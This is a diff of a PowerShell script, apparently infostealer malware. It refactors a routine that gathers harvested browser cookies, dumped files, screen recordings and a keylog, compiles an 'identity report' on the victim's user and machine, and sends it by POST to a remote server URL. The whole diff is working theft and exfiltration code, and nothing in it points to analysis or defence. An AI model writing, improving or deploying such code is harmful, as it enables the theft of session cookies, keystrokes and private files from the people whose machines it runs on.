@@ -148,43 +148,20 @@ function Archive-And-Report {
         $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Encoding utf8
         "System: $user@$env:COMPUTERNAME`nDate: $timestamp" | Set-Content $meta
 
-        $pathsToArchive = @($logPath, $meta, $keylogPath)
-
-        if (Test-Path $cookieDir) {
-            $pathsToArchive += Get-ChildItem $cookieDir -Recurse -File -ErrorAction SilentlyContinue
-        }
-
-        if (Test-Path $fileDumpDir) {
-            $pathsToArchive += Get-ChildItem $fileDumpDir -Recurse -File -ErrorAction SilentlyContinue
-        }
-
         if (Test-Path $recordingDir) {
             Get-ChildItem $recordingDir -Filter *.mp4 -File -ErrorAction SilentlyContinue | ForEach-Object {
-                $targetPath = "$videoSubDir\$($_.Name)"
-                Copy-Item $_.FullName $targetPath -Force -ErrorAction SilentlyContinue
-                $pathsToArchive += $targetPath
+                Copy-Item $_.FullName "$videoSubDir\$($_.Name)" -Force -ErrorAction SilentlyContinue
             }
         }
-        
+
         $pathsToArchive = @()
-
-        if (Test-Path $cookieDir) {
-            $pathsToArchive += Get-ChildItem $cookieDir -Recurse -File -ErrorAction SilentlyContinue
-        }
-        if (Test-Path $fileDumpDir) {
-            $pathsToArchive += Get-ChildItem $fileDumpDir -Recurse -File -ErrorAction SilentlyContinue
-        }
-        if (Test-Path $videoSubDir) {
-            $pathsToArchive += Get-ChildItem $videoSubDir -Recurse -File -ErrorAction SilentlyContinue
-        }
-
+        if (Test-Path $cookieDir)     { $pathsToArchive += Get-ChildItem $cookieDir     -Recurse -File -ErrorAction SilentlyContinue }
+        if (Test-Path $fileDumpDir)   { $pathsToArchive += Get-ChildItem $fileDumpDir   -Recurse -File -ErrorAction SilentlyContinue }
+        if (Test-Path $videoSubDir)   { $pathsToArchive += Get-ChildItem $videoSubDir   -Recurse -File -ErrorAction SilentlyContinue }
         $pathsToArchive += $logPath, $meta, $keylogPath
+
         if ($pathsToArchive.Count -eq 0) {
             Write-Warning "Nothing to archive - skipping archive/report"
-            return
-        }
-        if ($pathsToArchive.Count -eq 0) {
-            Write-Warning "Nothing to archive — skipping"
             return
         }
 
@@ -203,11 +180,13 @@ function Archive-And-Report {
         } else {
             $filesCount = 0
         }
+
         if (Test-Path $cookieDir) {
             $cookiesCount = (Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count
         } else {
             $cookiesCount = 0
         }
+
 
         $summary = @"
 PowerShell Identity Report
@@ -218,15 +197,14 @@ Files: $filesCount
 Cookies: $cookiesCount
 "@
 
-        try {
-            Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $summary } | ConvertTo-Json -Compress) -ContentType "application/json"
-        } catch {
-            Write-Warning "Failed to send report: $_"
-        }
+        $json = @{ text = $summary } | ConvertTo-Json -Compress
+        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body $json -ContentType "application/json"
+
     } catch {
         Write-Warning "Archive or report failed: $_"
     }
 }
+
 
 
 function Cleanup {
